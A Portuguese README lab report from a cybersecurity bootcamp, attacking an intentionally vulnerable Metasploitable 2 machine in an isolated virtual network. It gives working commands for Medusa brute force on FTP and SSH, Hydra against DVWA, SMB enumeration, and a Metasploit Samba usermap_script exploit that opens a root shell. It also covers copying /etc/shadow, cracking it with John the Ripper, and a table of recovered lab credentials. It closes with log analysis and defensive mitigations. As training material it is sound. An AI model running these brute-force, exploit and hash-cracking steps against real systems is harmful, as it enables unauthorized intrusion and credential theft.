# Laboratório Prático: Ataque de Força Bruta com Medusa e Análise de Logs

> **Projeto prático do Bootcamp Santander Cibersegurança na DIO.**
> Simulação controlada de dictionary attack com Medusa e análise de logs em ambiente virtualizado.

---

## Sumário
- [Visão Geral](#-visão-geral)
- [Topologia do Laboratório](#-topologia-do-laboratório)
- [Metodologia e Execução](#-metodologia-e-execução)
  - [1. Validação de Conectividade](#1-validação-de-conectividade)
  - [2. Criação da Wordlist](#2-criação-da-wordlist)
  - [3. Cenário 1: Força Bruta contra FTP (Porta 21)](#3-cenário-1-força-bruta-contra-ftp-porta-21)
  - [4. Cenário 2: Força Bruta contra SSH (Porta 22)](#4-cenário-2-força-bruta-contra-ssh-porta-22)
  - [5. Auditoria e Análise de Logs no Alvo](#5-auditoria-e-análise-de-logs-no-alvo)
  - [6. Cenário 3: Ataque Web no DVWA](#6-cenário-3-ataque-web-no-dvwa)
  - [7. Cenário 4: Enumeração SMB e Exploit Samba usermap_script](#7-cenário-4-enumeração-smb-e-exploit-samba-usermap_script)
  - [8. Pós-Exploração: /etc/shadow e John the Ripper](#8-pós-exploração-etcshadow-e-john-the-ripper)
- [Mitigações e Recomendações Defensivas](#-mitigações-e-recomendações-defensivas)
- [Credenciais Obtidas](#-credenciais-obtidas)
- [Pendências e Retomada](#-pendências-e-retomada)
- [Estrutura do Repositório](#-estrutura-do-repositório)

---

## Visão Geral

Quis reproduzir um teste de intrusão focado em login. Na prática, eu testei três coisas:

1. Como o Medusa faz força bruta chutando senha em massa contra o serviço.
2. Como cada serviço registra Failed/Accepted nos logs do sistema.
3. O que, na defesa, segura esse vetor numa empresa real.

---

## Topologia do Laboratório

Lab isolado no **VMware Workstation Pro**. Rede virtual em NAT (`192.168.81.0/24`):

| Máquina | Papel | Sistema Operacional | Endereço IP |
| :--- | :--- | :--- | :--- |
| **Atacante** | Estação de Testes / Pentest | Kali Linux | `192.168.81.128` |
| **Alvo** | Servidor Intencionalmente Vulnerável | Metasploitable 2 | `192.168.81.129` |

---

## Metodologia e Execução

### 1. Validação de Conectividade
Antes de rodar qualquer ataque, confirmei se o Kali alcançava o alvo:

```bash
# Executado no Kali Linux
ping -c 3 192.168.81.129
```
Retornou 3 pacotes transmitidos, 3 recebidos, **0% packet loss**. Rede OK.

---

### 2. Criação da Wordlist
Montei a `senhas.txt` na mão. Juntei senhas fracas comuns com a credencial real do serviço:

```bash
cat << 'EOF' > wordlists/senhas.txt
123456
password
admin
root
toor
letmein
msfadmin
EOF
```

---

### 3. Cenário 1: Força Bruta contra FTP (Porta 21)
Teste no **FTP** (*vsftpd*) pelo módulo `ftp` do Medusa:

```bash
medusa -h 192.168.81.129 -u msfadmin -P wordlists/senhas.txt -M ftp
```

Resultado — ele achou na 7ª tentativa:
```text
ACCOUNT FOUND: [ftp] Host: 192.168.81.129 User: msfadmin Password: msfadmin [SUCCESS]
```

![Evidência do Ataque FTP com Medusa](images/evidencia_ftp.png)

---

### 4. Cenário 2: Força Bruta contra SSH (Porta 22)
Repiti o teste no **OpenSSH**, porta 22:

```bash
medusa -h 192.168.81.129 -u msfadmin -P wordlists/senhas.txt -M ssh
```

Resultado:
```text
ACCOUNT FOUND: [ssh] Host: 192.168.81.129 User: msfadmin Password: msfadmin [SUCCESS]
```

![Evidência do Ataque SSH com Medusa](images/evidencia_ssh.png)

---

### 5. Auditoria e Análise de Logs no Alvo
Quis ver onde fica a trilha de auditoria depois dos ataques. Cada serviço loga num arquivo diferente:

#### A. Auditoria do Serviço SSH (OpenSSH)
Acompanhei o `auth.log` em tempo real:

```bash
sudo tail -f /var/log/auth.log
```
O que eu vi: senha errada gerou `Failed password for msfadmin from 192.168.81.128 port ... ssh2`. Quando acertei, apareceu `Accepted password for msfadmin from 192.168.81.128 port ... ssh2`.

#### B. Auditoria do Serviço FTP (vsftpd)
O vsftpd loga login e transferência no arquivo dele:

```bash
sudo tail -f /var/log/vsftpd.log
```
*(Também correlacionado em `/var/log/syslog`).*

#### C. Auditoria pós-ataque (grep)
Depois do ataque, conferi o que ficou gravado:

```bash
# SSH: sucessos e falhas
sudo grep -E "Failed password|Accepted password" /var/log/auth.log | tail -20

# FTP: últimas entradas
sudo tail -20 /var/log/vsftpd.log
# fallback, se o arquivo não existir
sudo grep vsftpd /var/log/auth.log | tail -20
```

É essa trilha que um analyst de SOC usa no SIEM para pegar brute force volumétrico e anomalia de login.

---

### 6. Cenário 3: Ataque Web no DVWA

**Alvo:** DVWA em `http://192.168.81.129/dvwa/`, nível `Low`. **Ação:** testei o login web com **Hydra** (`http-get-form`). **Resultado:** retornou 7 “senhas válidas”. Falso positivo. O Hydra estava sem `-f` e sem a string de erro do DVWA (`Username and/or password incorrect.`), então ele contou erro como acerto. Correção: usar `-f` e `F=Username and/or password incorrect.` na condição do `hydra`.

**DVWA via curl:** o login deu `302` mas `cookies_auth.txt` saiu vazio — incompleto. Deixei a solução em *Pendências e Retomada*: o `PHPSESSID` não muda no login, é o estado no servidor que muda. Reutilizei o `PHPSESSID` de `cookies.txt`.

---

### 7. Cenário 4: Enumeração SMB e Exploit Samba usermap_script

**Enumeração:**
```bash
nmap -p 139,445 192.168.81.129           # portas SMB abertas
enum4linux -U 192.168.81.129              # ~36 usuários enumerados
enum4linux -a 192.168.81.129              # shares e detalhes
```
Achei os shares `tmp` (gravável), `opt`, `print$`, `ADMIN$`, `IPC$`, `msfadmin`.

**Exploração — Samba usermap_script (CVE-2007-2447):**
O Metasploitable 2 roda Samba 3.0.20, vulnerável ao *usermap script*. O exploit abre shell como **root**:

```bash
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.168.81.129; set LHOST 192.168.81.128; set LPORT 4444; run"
```
Retornou `uid=0(root)`. Máquina totalmente comprometida. Comando de retomada em *Pendências e Retomada*.

---

### 8. Pós-Exploração: /etc/shadow e John the Ripper

Com shell root, copiei `/etc/shadow` para `/tmp/hashes.txt` e crackeei com **John the Ripper** (formato `md5crypt`):

```bash
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
# 3 hashes: sys:batman, klog:123456789, service:service

john --format=md5crypt --wordlist=wordlists/senhas.txt /tmp/hashes.txt
# +3: msfadmin, postgres, user
# Total: 6 de 7 hashes crackeados
```

O root eu não quebrei: `root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.`. Tentei rockyou, rules, mask `?l?l?l?l?l?l` e stdin `batman`. Nada. Como eu já tinha root pelo exploit, deixei o crack como opcional, só para o relatório. Se quiser fechar, dá para tentar hashcat com GPU ou wordlist maior. Detalhes em *Pendências e Retomada*.

**Observação:** o `setxkbmap br` no começo da sessão bagunçou o prompt (`Б”ҲБ”қ`). Só cosmético, não quebrou nenhum teste.

---

## Mitigações e Recomendações Defensivas

1. **Bloqueio automático e rate limiting:** deixo o **Fail2ban** bloqueando o IP depois de várias falhas seguidas.
2. **Senha forte:** mínimo de 12 a 16 caracteres, com entropia, e checagem contra dicionário de credencial vazada.
3. **Autenticação multifator (MFA / 2FA):** segundo fator em serviço exposto e portal admin.
4. **Fim do protocolo em texto claro:** desativo o **FTP** puro (porta 21) e uso **SFTP** ou **FTPS**.
5. **Chave em vez de senha no SSH:** no OpenSSH uso `PasswordAuthentication no` e chave pública/privada (Ed25519 ou RSA 4096).
6. **Monitoramento de SOC:** coleto login no SIEM e crio alerta quando o volume de Failed dispara.

---

## Credenciais Obtidas

Senhas do Metasploitable 2, lab vulnerável de propósito. Peguei por brute force, enumeração e pós-exploração.

| Serviço | Usuário | Senha | Origem |
| :--- | :--- | :--- | :--- |
| FTP | msfadmin | msfadmin | Medusa (Cenário 1) |
| SSH | msfadmin | msfadmin | Medusa (Cenário 2) |
| SSH | sys | batman | John the Ripper (rockyou) |
| SSH | klog | 123456789 | John the Ripper (rockyou) |
| SSH | service | service | John the Ripper (rockyou) |
| PostgreSQL | postgres | postgres | John the Ripper (wordlist custom) |
| Sistema | user | user | John the Ripper (wordlist custom) |
| **Root (shell)** | root | *(via exploit, sem senha)* | `exploit/multi/samba/usermap_script` — `uid=0(root)` |

**Total John:** 6 de 7 hashes do `/etc/shadow` crackeados (todos exceto o root).

---

## Pendências e Retomada

### 1. Crack do hash do root (único que falta)
```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
```
Tentativas: rockyou, rules, mask `?l?l?l?l?l?l`, stdin `batman` → **sem sucesso**. Como eu já sou **root** pelo Samba usermap_script, o crack é opcional, só para fechar o relatório. Alternativas: `passwd root` no shell root, ou hashcat com GPU.

### 2. DVWA via curl (opcional)
O login retornou `302` mas `cookies_auth.txt` saiu vazio. O `PHPSESSID` é o mesmo de `cookies.txt`, não muda no login. É o estado no servidor que muda. Teste com:
```bash
PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
curl -b "PHPSESSID=$PHPSESSID; security=low" \
  "http://192.168.81.129/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login" \
  -s | grep -i welcome
```

### 3. Hydra do DVWA (corrigir falso positivo)
Falta `-f` e a string de falha correta (`Username and/or password incorrect.`). O output mostrou 7 “válidas”, impossível. Corrijo com `-f`.

### Comandos para retomar

```bash
# 1. Reabrir shell root
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.168.81.129; set LHOST 192.168.81.128; set LPORT 4444; run"

# 2. Crack root isolado (se quiser)
echo 'root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.' > ~/root_only.txt
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt ~/root_only.txt

# 3. DVWA
PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
curl -b "PHPSESSID=$PHPSESSID; security=low" \
  "http://192.168.81.129/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login" \
  -s | grep -i welcome
```

**Observações:**
- O hash do root **não está no rockyou** com as regras que usei; pode precisar de hashcat + GPU ou wordlist maior.
- `setxkbmap br` bagunçou alguns caracteres do prompt (`Б”ҲБ”қ`) — cosmético, não quebrou nada.
- A sessão MSF fechou por engano (`exit`); para reabrir, rodo o msfconsole de novo com o mesmo comando.
- **SSH no Kali novo:** o Metasploitable só oferece chaves antigas (`ssh-rsa,ssh-dss`). Se der `no matching host key type found`, conecto com:
  ```bash
  ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.81.129
  # senha: msfadmin
  ```

---

## Estrutura do Projeto

```text
medusa-kali-lab/
├── images/             # Capturas de tela comprobatórias
│   ├── evidencia_ftp.png
│   ├── evidencia_ssh.png
│   ├── evidencia_logs.png
│   ├── evidencia_dvwa.png
│   ├── evidencia_enum4linux.png
│   ├── evidencia_samba.png
│   └── evidencia_john.png
├── wordlists/          # Wordlist de testes utilizada
│   └── senhas.txt
└── README.md           # Relatório técnico completo
```

---
*Autor: cyndaquil ([hinoarashi](https://github.com/hinoarashi)) | Desenvolvido no Bootcamp Santander Cibersegurança na DIO.*
